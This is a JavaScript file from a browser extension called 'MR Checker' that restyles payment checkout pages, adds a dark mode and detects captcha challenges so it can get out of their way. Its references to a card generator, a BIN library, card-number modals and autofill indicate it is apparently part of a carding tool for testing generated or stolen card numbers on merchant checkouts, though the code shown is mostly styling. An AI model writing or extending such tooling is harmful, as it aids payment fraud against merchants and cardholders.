
(function () {
  'use strict';

  // Unified key reference (available because storage module loads first)
  var K = window.LynixKeys || {};

  let isDashboardActive = false;

  const REQUIRED_MODULES = {
    'storage.js': () => window.__LYNIX_STORAGE_LOADED === true && typeof window.LynixStorage !== 'undefined',
    'autofill.js': () => window.__LYNIX_AUTOFILL_LOADED === true && typeof window.LynixAutofill !== 'undefined',
    'binlibrary.js': () => window.__LYNIX_BINLIBRARY_LOADED === true && typeof window.LynixBinLibrary !== 'undefined'
  };

  function verifyModules() {
    const missingModules = [];
    const loadedModules = [];

    for (const [moduleName, checkFn] of Object.entries(REQUIRED_MODULES)) {
      try {
        if (checkFn()) {
          loadedModules.push(moduleName);
        } else {
          missingModules.push(moduleName);
        }
      } catch (e) {
        missingModules.push(moduleName);
      }
    }

    return { missingModules, loadedModules };
  }

  function showMissingFilesError(missingModules) {
    const existing = document.getElementById('lynix-file-error-overlay');
    if (existing) existing.remove();

    const overlay = document.createElement('div');
    overlay.id = 'lynix-file-error-overlay';
    overlay.className = 'lynix-error-overlay';

    const content = document.createElement('div');
    content.className = 'lynix-error-content';

    const header = document.createElement('div');
    header.className = 'lynix-error-header';
    header.innerHTML = LX.warn + ' MR Checker - File Error';

    const body = document.createElement('div');
    body.className = 'lynix-error-body';

    const msg = document.createElement('p');
    msg.className = 'lynix-error-msg';
    msg.textContent = 'Extension files are missing or corrupted. Please reinstall the extension.';

    const missingBox = document.createElement('div');
    missingBox.className = 'lynix-error-missing';

    const missingTitle = document.createElement('div');
    missingTitle.className = 'lynix-error-title';
    missingTitle.textContent = 'Missing Files:';
    missingBox.appendChild(missingTitle);

    missingModules.forEach(m => {
      const item = document.createElement('div');
      item.className = 'lynix-error-item';
      item.innerHTML = '<span class="lynix-error-x">' + LX.x + '</span> ' + m;
      missingBox.appendChild(item);
    });

    const fixBox = document.createElement('div');
    fixBox.className = 'lynix-error-fix';

    const fixTitle = document.createElement('div');
    fixTitle.className = 'lynix-error-title lynix-error-title-orange';
    fixTitle.textContent = 'How to fix:';
    fixBox.appendChild(fixTitle);

    const fixList = document.createElement('ol');
    fixList.className = 'lynix-error-list';
    ['Remove the current extension', 'Download the latest MR Checker package', 'Load the extension again in Chrome'].forEach(step => {
      const li = document.createElement('li');
      li.textContent = step;
      fixList.appendChild(li);
    });
    fixBox.appendChild(fixList);

    body.appendChild(msg);
    body.appendChild(missingBox);
    body.appendChild(fixBox);
    content.appendChild(header);
    content.appendChild(body);
    overlay.appendChild(content);

    document.body.appendChild(overlay);
  }

  const { missingModules, loadedModules } = verifyModules();

  if (missingModules.length > 0) {
    if (document.body) {
      showMissingFilesError(missingModules);
    } else {
      document.addEventListener('DOMContentLoaded', () => showMissingFilesError(missingModules));
    }
    window.__LynixCheckouterBlocked = true;
    return;
  }

  window.__LynixCheckouterVerified = true;
})();

if (window.__LynixCheckouterBlocked) {
} else if (window.__LynixCheckouterLoaded) {
} else {
  window.__LynixCheckouterLoaded = true
  var K = window.LynixKeys || {};
  const LX = {
    warn: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-2px"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>',
    x: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-2px"><circle cx="12" cy="12" r="10"/><path d="m15 9-6 6"/><path d="m9 9 6 6"/></svg>',
    refresh: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/><path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16"/><path d="M8 16H3v5"/></svg>',
    download: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-2px"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>',
    book: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-2px"><path d="M4 19.5v-15A2.5 2.5 0 0 1 6.5 2H20v20H6.5a2.5 2.5 0 0 1 0-5H20"/></svg>',
    edit: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-2px"><path d="M17 3a2.85 2.83 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5Z"/></svg>',
    save: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-2px"><path d="M15.2 3a2 2 0 0 1 1.4.6l3.8 3.8a2 2 0 0 1 .6 1.4V19a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2z"/><path d="M17 21v-7a1 1 0 0 0-1-1H8a1 1 0 0 0-1 1v7"/><path d="M7 3v4a1 1 0 0 0 1 1h7"/></svg>',
    phone: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-2px"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>',
    key: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-2px"><circle cx="7.5" cy="15.5" r="5.5"/><path d="m21 2-9.6 9.6"/><path d="m15.5 7.5 3 3L21 8"/></svg>',
    loading: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-2px" class="lx-spin"><path d="M12 2v4"/><path d="m16.2 7.8 2.9-2.9"/><path d="M18 12h4"/><path d="m16.2 16.2 2.9 2.9"/><path d="M12 18v4"/><path d="m4.9 19.1 2.9-2.9"/><path d="M2 12h4"/><path d="m4.9 4.9 2.9 2.9"/></svg>',
    music: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>',
    musicPlay: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/><path d="M3 2l2 2"/><path d="M19 2l2 2"/></svg>',
    play: '<svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><polygon points="5,3 19,12 5,21"/></svg>',
    stop: '<svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><rect x="4" y="4" width="16" height="16" rx="2"/></svg>',
    copy: '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>',
    check: '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>',
    ban: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-2px"><circle cx="12" cy="12" r="10"/><path d="m4.9 4.9 14.2 14.2"/></svg>',
    chevDown: '<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>',
    chevUp: '<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 15 12 9 18 15"/></svg>',
  };
  let isDashboardActive = false;
  let isCaptchaVisible = false;
  let isRestoringAfterCaptcha = false;
  let wasAutoHiddenByCaptcha = false;
  let dashboardStateBeforeCaptcha = null;
  const excludedClasses = [
    'card-generator-overlay', 'lynix-page-watermark', 'success-toast',
    'success-toast-content', 'success-toast-text', 'success-toast-title',
    'success-toast-details', 'success-ripple-container', 'success-ripple-ring',
    'success-check', 'warning-toast', 'card-toast', 'cc-modal', 'snowfall-container',
    'celebration-container', 'color-ball-container', 'bin-input-row',
    'panel-header', 'panel-body', 'panel-title', 'update-screen',
    'color-ball', 'snowflake', 'sparkle', 'section', 'section-divider',
    'action-btn', 'primary-btn', 'collapsible-section', 'collapsible-header',
    'collapsible-content', 'mode-toggle', 'mode-option', 'header-controls',
    'panel-header-content', 'minimize-btn', 'music-toggle',
    'lynix-bottom-ip-bar', 'ip-bar-row', 'ip-bar-label', 'ip-bar-value', 'ip-bar-divider',
    'ipbar-user-section', 'ipbar-pfp-wrap', 'ipbar-pfp', 'ipbar-pfp-fallback',
    'ipbar-user-meta', 'ipbar-username', 'ipbar-stats', 'ipbar-ip-section',
    'ipbar-status-dot', 'ipbar-ip-label', 'ipbar-ip-value', 'ipbar-divider'
  ];
  const excludedContainerSelectors = [
    '.card-generator-overlay', '.lynix-page-watermark', '.success-toast',
    '.success-toast-content', '.success-toast-text',
    '.warning-toast', '.card-toast', '.cc-modal', '.snowfall-container',
    '.celebration-container', '.color-ball-container', '.section',
    '.section-divider', '.collapsible-section', '.lynix-bottom-ip-bar',
    '[class*="hcaptcha"]', '[class*="h-captcha"]', '[class*="captcha"]',
    '[class*="Captcha"]', '[class*="challenge"]', '[class*="Challenge"]',
    '[class*="modal"]', '[class*="Modal"]', '[class*="overlay"]', '[class*="Overlay"]',
    '[role="dialog"]', '[role="alertdialog"]',
    '[class*="PaymentMethod"]', '[class*="payment-method"]', '[class*="paymentMethod"]',
    '[class*="PaymentOptions"]', '[class*="payment-options"]',
    '[class*="WalletOptions"]', '[class*="wallet-options"]',
    '[role="radiogroup"]', '[role="tablist"]'
  ];
  function isExcludedElement(el) {
    if (!el || !el.classList) return false;
    if (el.closest && el.closest('.card-generator-overlay')) return true;
    if (el.closest && el.closest('.success-toast')) return true;
    if (el.closest && el.closest('.warning-toast')) return true;
    if (el.closest && el.closest('.card-toast')) return true;
    if (el.closest && el.closest('.lynix-bottom-ip-bar')) return true;
    if (el.closest && el.closest('.bin-recommend-popup')) return true;
    if (el.closest && el.closest('.bin-notification')) return true;
    if (el.closest && el.closest('#lynix-bin-recommend')) return true;
    if (el.closest && el.closest('#lynix-bin-notification')) return true;
    if (el.closest && el.closest('.cc-modal')) return true;
    if (el.closest && (
      el.closest('[data-hcaptcha]') ||
      el.closest('[class*="hcaptcha"]') ||
      el.closest('[class*="h-captcha"]') ||
      el.closest('[id*="hcaptcha"]') ||
      el.closest('[id*="h-captcha"]') ||
      el.closest('iframe[src*="hcaptcha"]') ||
      el.closest('[class*="captcha"]') ||
      el.closest('[class*="Captcha"]') ||
      el.closest('[class*="challenge"]') ||
      el.closest('[class*="Challenge"]')
    )) return true;
    for (const cls of excludedClasses) {
      if (el.classList.contains(cls)) return true;
    }
    if (el.id && el.id.includes('lynix')) return true;
    if (el.id && (el.id.includes('hcaptcha') || el.id.includes('captcha'))) return true;
    if (el.closest) {
      for (const selector of excludedContainerSelectors) {
        if (el.closest(selector)) return true;
      }
    }
    return false;
  }
  function addSmoothTransition(el) {
    try {
      const currentTransition = el.style.transition || '';
      if (!currentTransition.includes('background')) {
        el.style.transition = currentTransition ?
          currentTransition + ', background-color 0.3s ease' :
          'background-color 0.3s ease';
      }
    } catch (e) { }
  }
  function removeSmoothTransition(el) {
    try {
      setTimeout(() => {
        const currentTransition = el.style.transition || '';
        el.style.transition = currentTransition.replace(/,?\s*background-color\s*[\d.]*s?\s*ease/g, '').trim();
      }, 350);
    } catch (e) { }
  }
  function checkCaptchaVisible() {
    try {

      const captchaIframes = document.querySelectorAll(
        'iframe[src*="hcaptcha"], iframe[src*="captcha"], iframe[src*="challenge"], ' +
        'iframe[data-hcaptcha], iframe[title*="hCaptcha"], iframe[title*="captcha"], ' +
        'iframe[title*="challenge"], iframe[title*="verification"], ' +
        'iframe[src*="recaptcha"], iframe[src*="turnstile"], iframe[src*="arkoselabs"]'
      );
      for (const iframe of captchaIframes) {
        try {
          const rect = iframe.getBoundingClientRect();
          const style = window.getComputedStyle(iframe);
          if (rect.width > 0 && rect.height > 0 &&
            style.display !== 'none' && style.visibility !== 'hidden' &&
            style.opacity !== '0') {
            return true;
          }
        } catch (e) {
          continue;
        }
      }

      const captchaContainers = document.querySelectorAll(
        '[class*="hcaptcha"], [class*="h-captcha"], [id*="hcaptcha"], [id*="h-captcha"], ' +
        '[data-hcaptcha], [class*="captcha-container"], [class*="captcha-overlay"], ' +
        '[class*="challenge-container"], [class*="ChallengeContainer"], ' +
        '[class*="recaptcha"], [class*="turnstile"], [class*="cf-turnstile"], ' +
        '[class*="captcha-modal"], [class*="CaptchaModal"], [class*="captcha_modal"], ' +
        '[class*="verification-modal"], [class*="VerificationModal"]'
      );
      for (const container of captchaContainers) {
        try {
          const rect = container.getBoundingClientRect();
          const style = window.getComputedStyle(container);
          if (rect.width > 50 && rect.height > 50 &&
            style.display !== 'none' && style.visibility !== 'hidden' &&
            style.opacity !== '0') {
            return true;
          }
        } catch (e) {
          continue;
        }
      }

      const fullScreenOverlays = document.querySelectorAll(
        '[class*="challenge-overlay"], [class*="Challenge-overlay"], ' +
        '[class*="security-challenge"], [class*="SecurityChallenge"]'
      );
      for (const overlay of fullScreenOverlays) {
        try {
          const rect = overlay.getBoundingClientRect();
          const style = window.getComputedStyle(overlay);
          if (rect.width > window.innerWidth * 0.5 && rect.height > window.innerHeight * 0.3 &&
            style.display !== 'none' && style.visibility !== 'hidden' &&
            style.opacity !== '0') {
            return true;
          }
        } catch (e) {
          continue;
        }
      }
      return false;
    } catch (e) {
      return false;
    }
  }
  const preserveOriginalSelectors = [
    '[class*="BrandIcon"]', '[class*="CardBrand"]', '[class*="brand-icon"]',
    '.SubmitButton', '[class*="SubmitButton"]', 'button[type="submit"]', '.Button--primary',
    '[data-testid="hosted-payment-submit-button"]',
    '[class*="cvc"]', '[class*="Cvc"]', '[class*="cvv"]', '[class*="SecurityCode"]',
    '[class*="Link"]', '[class*="link-button"]', '[class*="LinkButton"]',
    '[class*="PaymentMethod"]', '[class*="payment-method"]', '[class*="paymentMethod"]',
    '[class*="Tab"]', '[class*="tab"]', 'button[role="tab"]',
    '[class*="Radio"]', '[class*="radio"]', 'input[type="radio"]',
    '[class*="Wallet"]', '[class*="wallet"]',
    '[class*="Icon"]', '[class*="icon"]', '[class*="Logo"]', '[class*="logo"]',
    'svg', '[role="img"]',
    'input', 'select', '.Input', '[class*="Input"]',
    'footer', '.Footer', '[class*="Footer"]', '[class*="footer"]',
    'iframe',
    '[class*="FormFieldGroup"]', '[class*="form-field"]', '[class*="FormField"]',
    '[class*="CheckoutForm"]', '[class*="checkout-form"]', '[class*="PaymentForm"]',
    '[class*="ContactInformation"]', '[class*="contact-information"]',
    '[class*="BillingAddress"]', '[class*="billing-address"]',
    '[class*="ShippingAddress"]', '[class*="shipping-address"]',
    '[class*="CardElement"]', '[class*="card-element"]',
    '[class*="ElementsApp"]', '[class*="elements-app"]',
    '[class*="CheckoutPaymentForm"]', '[class*="PaymentMethodSelector"]',
    '[class*="AccordionItem"]', '[class*="accordion"]',
    '[class*="Fieldset"]', '[class*="fieldset"]',
    '[class*="FormRow"]', '[class*="form-row"]',
    '[class*="TextField"]', '[class*="text-field"]',
    '[class*="SelectField"]', '[class*="select-field"]',
    '[class*="Checkbox"]', '[class*="checkbox"]',
    'label', '[class*="Label"]',
    '[class*="TermsText"]', '[class*="terms"]',
    '[class*="ReadOnlyFormField"]', '[class*="read-only"]',
    '[class*="SavedPaymentMethod"]', '[class*="saved-payment"]'
  ];
  function isDesktop() {
    return window.innerWidth > 768;
  }

  function getDeviceType() {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;

    const hasTouch = 'ontouchstart' in window ||
      navigator.maxTouchPoints > 0 ||
      navigator.msMaxTouchPoints > 0;

    const hasCoarsePointer = window.matchMedia && window.matchMedia('(pointer: coarse)').matches;

    const canHover = window.matchMedia && window.matchMedia('(hover: hover)').matches;

    const uaIsiOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
    const uaIsAndroid = /android/i.test(userAgent);
    const uaIsMobile = /Mobi|Mobile|webOS|BlackBerry|Opera Mini|IEMobile/i.test(userAgent);

    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const devicePixelRatio = window.devicePixelRatio || 1;
    const smallScreen = Math.min(screenWidth, screenHeight) <= 768;

    const hasOrientationType = screen.orientation && screen.orientation.type;

    if (uaIsiOS) {
      return 'ios';
    }

    if (hasTouch && hasCoarsePointer && !canHover) {
      if (uaIsAndroid) {
        return /mobile/i.test(userAgent) ? 'android_phone' : 'android_tablet';
      }
      return 'mobile';
    }

    if (hasTouch && smallScreen && devicePixelRatio >= 2) {
      if (uaIsAndroid) {
        return 'android_phone';
      }
      return 'mobile';
    }

    if (hasTouch && hasCoarsePointer) {
      return 'mobile';
    }

    if (uaIsAndroid) {
      return /mobile/i.test(userAgent) ? 'android_phone' : 'android_tablet';
    }

    if (uaIsMobile) {
      return 'mobile';
    }

    if (hasTouch && smallScreen) {
      return 'mobile';
    }

    return 'desktop';
  }

  function isMobileDevice() {
    const deviceType = getDeviceType();
    return ['ios', 'android_phone', 'android_tablet', 'mobile'].includes(deviceType);
  }

  function isIOSDevice() {
    const userAgent = navigator.userAgent || '';
    return /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
  }

  function isDesktopDevice() {
    return getDeviceType() === 'desktop';
  }

  function isTouchDevice() {
    return 'ontouchstart' in window ||
      navigator.maxTouchPoints > 0 ||
      navigator.msMaxTouchPoints > 0;
  }

  function shouldApplyBackgroundColor() {
    return isMobileDevice() || (isTouchDevice() && window.matchMedia('(pointer: coarse)').matches);
  }

  const desktopPreserveSelectors = [
    '[class*="RightPanel"]', '[class*="right-panel"]', '[class*="rightPanel"]',
    '[class*="FormContainer"]', '[class*="form-container"]',
    '[class*="PaymentElement"]', '[class*="payment-element"]',
    '[class*="CheckoutRightColumn"]', '[class*="checkout-right"]',
    '[class*="OrderForm"]', '[class*="order-form"]',
    '[class*="CheckoutContent"]', '[class*="checkout-content"]',
    '[class*="MainContent"]', '[class*="main-content"]',
    '[class*="FormSection"]', '[class*="form-section"]',
    '[class*="CheckoutMain"]', '[class*="checkout-main"]',
    '[class*="PaymentSection"]', '[class*="payment-section"]',
    '[class*="ContactSection"]', '[class*="contact-section"]',
    '[class*="App-Payment"]', '[class*="app-payment"]',
    '[class*="StripeElement"]', '[class*="stripe-element"]'
  ];
  function shouldPreserveElement(el) {
    if (!el) return false;
    for (const selector of preserveOriginalSelectors) {
      try {
        if (el.matches && el.matches(selector)) return true;
        if (el.closest && el.closest(selector)) return true;
      } catch (e) { }
    }
    if (isDesktop()) {
      for (const selector of desktopPreserveSelectors) {
        try {
          if (el.matches && el.matches(selector)) return true;
          if (el.closest && el.closest(selector)) return true;
        } catch (e) { }
      }
    }
    return false;
  }

  const RANDOM_BG_COLORS = [
    "#0d9488", "#0f766e", "#115e59", "#134e4a", "#14b8a6",
    "#0e7490", "#155e75", "#164e63", "#047857", "#065f46"
  ];

  const DEFAULT_BG_COLOR = "#0f766e";
  let pageBackgroundColor = DEFAULT_BG_COLOR;
  let bgColorEnabled = false;
  let hasCustomColor = false;
  let sessionRandomColor = null;

  function getRandomBgColor() {
    const randomIndex = Math.floor(Math.random() * RANDOM_BG_COLORS.length);
    return RANDOM_BG_COLORS[randomIndex];
  }

  function loadBgColorSetting() {
    return new Promise((resolve) => {
      const savedEnabled = localStorage.getItem(K.BG_ENABLED);
      const savedColor = localStorage.getItem(K.PAGE_BG_COLOR);
      const savedHasCustom = localStorage.getItem(K.PAGE_HAS_CUSTOM);

      bgColorEnabled = savedEnabled === "true";
      hasCustomColor = savedHasCustom === "true";

      if (hasCustomColor && savedColor) {

        pageBackgroundColor = savedColor;
      } else if (bgColorEnabled) {

        sessionRandomColor = getRandomBgColor();
        pageBackgroundColor = sessionRandomColor;
      }
      resolve();
    });
  }

  function saveBgColorSetting(enabled, color, isCustom = false) {
    bgColorEnabled = enabled;
    hasCustomColor = isCustom;

    localStorage.setItem(K.BG_ENABLED, enabled ? "true" : "false");
    localStorage.setItem(K.PAGE_HAS_CUSTOM, isCustom ? "true" : "false");

    if (isCustom) {
      pageBackgroundColor = color;
      localStorage.setItem(K.PAGE_BG_COLOR, color);
    }

    var bgData = {};
    bgData[K.BG_ENABLED] = enabled;
    bgData[K.PAGE_BG_COLOR] = isCustom ? color : "";
    bgData[K.PAGE_HAS_CUSTOM] = isCustom;
    window.postMessage({
      type: 'LYNIX_STORAGE_REQUEST',
      requestId: 'bg_' + Date.now(),
      action: 'SET',
      data: bgData
    }, '*');
  }

  loadBgColorSetting().then(() => {
    if (bgColorEnabled && typeof applyCustomStyles === 'function') {
      applyCustomStyles();
    }
  });

  function isInPaymentFormArea(el) {
    if (!el) return false;
    const paymentFormSelectors = [
      '[class*="RightPanelContent"]', '[class*="rightPanelContent"]',
      '[class*="App-Payment"]', '[class*="PaymentFormContainer"]',
      '[class*="CheckoutPaymentForm"]', '[class*="PaymentMethodForm"]',
      '[class*="FormFieldGroup"]', '[class*="ContactInformation"]',
      '[class*="BillingAddressForm"]', '[class*="PaymentElement"]',
      '[class*="ElementsApp"]', '[class*="StripeElement"]',
      '[class*="CheckoutForm"]', '[class*="PaymentRequestButton"]',
      '[class*="AccordionItemContent"]', '[class*="FormRow"]',
      '[data-testid*="payment"]', '[data-testid*="checkout"]',
      '[class*="Column--right"]', '[class*="column-right"]',
      '[class*="RightColumn"]', '[class*="right-column"]'
    ];
    for (const selector of paymentFormSelectors) {
      try {
        if (el.closest && el.closest(selector)) return true;
      } catch (e) { }
    }
    if (isDesktop()) {
      try {
        const rect = el.getBoundingClientRect();
        const screenMidpoint = window.innerWidth / 2;
        if (rect.left > screenMidpoint - 100) {
          const computed = window.getComputedStyle(el);
          const bg = computed.backgroundColor;
          if (bg && (bg.includes('255, 255, 255') || bg.includes('250, 250, 250') || bg.includes('248, 248, 248') || bg.includes('245, 245, 245'))) {
            return true;
          }
        }
      } catch (e) { }
    }
    return false;
  }
  let _bgStyleTag = null;
  let _lastAppliedBgColor = null;
  let _bgProcessed = new WeakSet();
  let _bgRafId = null;

  function _ensureBgStyleTag(bgColor) {
    if (_lastAppliedBgColor !== bgColor) {
      _lastAppliedBgColor = bgColor;
      document.documentElement.style.setProperty('background', bgColor, 'important');
      document.documentElement.style.setProperty('background-color', bgColor, 'important');
      document.documentElement.style.setProperty('min-height', '100vh', 'important');
      if (document.body) {
        document.body.style.setProperty('background', bgColor, 'important');
        document.body.style.setProperty('background-color', bgColor, 'important');
        document.body.style.setProperty('min-height', '100vh', 'important');
      }
    }
  }

  function _setBg(el, bgColor) {
    if (_bgProcessed.has(el)) return;
    el.style.setProperty('background', bgColor, 'important');
    el.style.setProperty('background-color', bgColor, 'important');
    _bgProcessed.add(el);
  }

  function applyCustomStyles() {

    if (!bgColorEnabled) {
      return;
    }

    if (!shouldApplyBackgroundColor()) {
      return;
    }

    isCaptchaVisible = checkCaptchaVisible();
    if (isCaptchaVisible) {
      return;
    }

    let bgColor;
    if (hasCustomColor) {
      bgColor = pageBackgroundColor;
    } else {

      if (!sessionRandomColor) {
        sessionRandomColor = getRandomBgColor();
      }
      bgColor = sessionRandomColor;
    }

    if (_lastAppliedBgColor !== bgColor) {
      _bgProcessed = new WeakSet();
    }

    _ensureBgStyleTag(bgColor);

    const onDesktop = isDesktop();

    const allSelectors = onDesktop
      ? '[class*="LeftPanel"], [class*="left-panel"], [class*="leftPanel"], [class*="Column--left"], [class*="LeftColumn"], [class*="ProductSummary"], [class*="OrderSummary"], [class*="product-summary"], [class*="App"], [class*="Page"], [class*="Root"], [class*="Shell"], section, main, article, header, aside, nav, .Divider, [class*="divider"], [class*="Divider"], [class*="ViewDetails"], [class*="details"], [class*="Details"], [class*="OrderDetails"], [class*="order-details"], [class*="Summary"], [class*="summary"], [class*="PaymentDetails"], [class*="payment-details"], [class*="LineItem"], [class*="line-item"], [class*="OrderSummary"], [class*="order-summary"], [class*="ProductDetails"], [class*="product-details"]'
      : '[class*="App"], [class*="app"], [class*="Page"], [class*="page"], [class*="Container"], [class*="container"], [class*="Wrapper"], [class*="wrapper"], [class*="Layout"], [class*="layout"], [class*="Content"], [class*="content"], [class*="Main"], [class*="Body"], [class*="body"], [class*="Root"], [class*="root"], [class*="Shell"], [class*="shell"], [class*="Frame"], [class*="frame"], [class*="View"], [class*="view"], [class*="Panel"], [class*="panel"], [class*="Section"], [class*="section"], [class*="Block"], [class*="block"], [class*="Region"], [class*="region"], [class*="Area"], [class*="area"], [class*="Zone"], [class*="zone"], [class*="Checkout"], [class*="checkout"], [class*="Payment"], [class*="Stripe"], [class*="stripe"], section, main, article, header, aside, nav, .Divider, [class*="divider"], [class*="Divider"], [class*="ViewDetails"], [class*="details"], [class*="Details"], [class*="OrderDetails"], [class*="order-details"], [class*="Summary"], [class*="summary"], [class*="PaymentDetails"], [class*="payment-details"], [class*="LineItem"], [class*="line-item"], [class*="OrderSummary"], [class*="order-summary"], [class*="ProductDetails"], [class*="product-details"]';

    document.querySelectorAll(allSelectors).forEach(el => {
      if (!isExcludedElement(el) && !shouldPreserveElement(el) && (!onDesktop || !isInPaymentFormArea(el))) {
        _setBg(el, bgColor);
      }
    });

    if (onDesktop) {
      const divs = document.getElementsByTagName('div');
      for (let i = 0, len = divs.length; i < len; i++) {
        const el = divs[i];
        if (_bgProcessed.has(el)) continue;
        if (isExcludedElement(el) || shouldPreserveElement(el) || isInPaymentFormArea(el)) continue;
        const classes = el.className || '';
        if (typeof classes === 'string' && (classes.includes('Left') || classes.includes('left') || classes.includes('Product') || classes.includes('product') || classes.includes('Order') || classes.includes('order') || classes.includes('Summary') || classes.includes('summary'))) {
          _setBg(el, bgColor);
        }
      }
    } else {
      const divs = document.getElementsByTagName('div');
      for (let i = 0, len = divs.length; i < len; i++) {
        const el = divs[i];
        if (_bgProcessed.has(el)) continue;
        if (isExcludedElement(el) || shouldPreserveElement(el)) continue;
        _setBg(el, bgColor);
      }
    }

    if (!onDesktop) {
      if (_bgRafId) cancelAnimationFrame(_bgRafId);
      _bgRafId = requestAnimationFrame(() => {
        const tags = ['span', 'p', 'li', 'ul', 'ol', 'dl', 'table', 'tr', 'td', 'th', 'form', 'fieldset', 'figure', 'figcaption', 'footer'];
        for (let t = 0; t < tags.length; t++) {
          const els = document.getElementsByTagName(tags[t]);
          for (let i = 0, len = els.length; i < len; i++) {
            const el = els[i];
            if (_bgProcessed.has(el)) continue;
            if (isExcludedElement(el) || shouldPreserveElement(el)) continue;
            _setBg(el, bgColor);
          }
        }
        _bgRafId = null;
      });
    }
  }

  // ============= DARK MODE FOR CHECKOUT PAGES =============
  function applyCheckoutDarkMode() {
    if (document.getElementById("lx-dark-mode-style")) return

    // Disable the random/custom background color system so it doesn't override
    bgColorEnabled = false

    const style = document.createElement("style")
    style.id = "lx-dark-mode-style"
    // Exclude extension UI: anything with lx- class or id
    const EX = ':not([class*="lx-"]):not([id*="lx"]):not([class*="usagi"])';
    style.textContent = `
      html, body {
        background-color: #000000 !important;
        color: #ffffff !important;
        --skeleton-bg-color: #000000;
      }
      .App-Overview, .App-Payment, .App-Background,
      .Accordion, .App-Container,
      [class*="App-Container"], [class*="App-Overview"],
      [class*="App-Payment"], [class*="App-Background"],
      [class*="LeftPanel"], [class*="left-panel"],
      [class*="LeftColumn"], [class*="Column--left"],
      [class*="OrderDetails"], [class*="PaymentForm"],
      [class*="ProductSummary"], [class*="CheckoutHeader"],
      [class*="Section"]${EX}, [class*="LineItem"],
      [class*="ReadOnlyForm"], [class*="FormField"],
      [class*="Shell"], [class*="Root"], [class*="Page"],
      [class*="Wrapper"]${EX}, [class*="Container"]${EX},
      [class*="Header"]${EX}, [class*="Footer"]${EX},
      [class*="Content"]${EX}, [class*="Layout"]${EX},
      [class*="Checkout"], [class*="Payment"]${EX},
      [class*="product"], [class*="Product"],
      [class*="order"], [class*="Order"],
      [class*="summary"], [class*="Summary"],
      main, section, header, aside, nav, footer, article, form,
      div${EX}:not([class*="SubmitButton"]):not(.Button--primary):not([data-testid="hosted-payment-submit-button"]) {
        background-color: #000000 !important;
        background: #000000 !important;
      }
      .App-Container:not(.local-setup-mode)::before {
        background: #000000 !important;
      }
      *${EX}:not([class*="SubmitButton"]):not(.Button--primary) {
        color: #ffffff !important;
        border-color: #222 !important;
      }
      input${EX}, select${EX}, textarea${EX} {
        background-color: #111111 !important;
        color: #ffffff !important;
        border-color: #333333 !important;
      }
      button${EX}:not([type="submit"]):not(.SubmitButton):not([class*="SubmitButton"]):not(.Button--primary) {
        background-color: #1a1a1a !important;
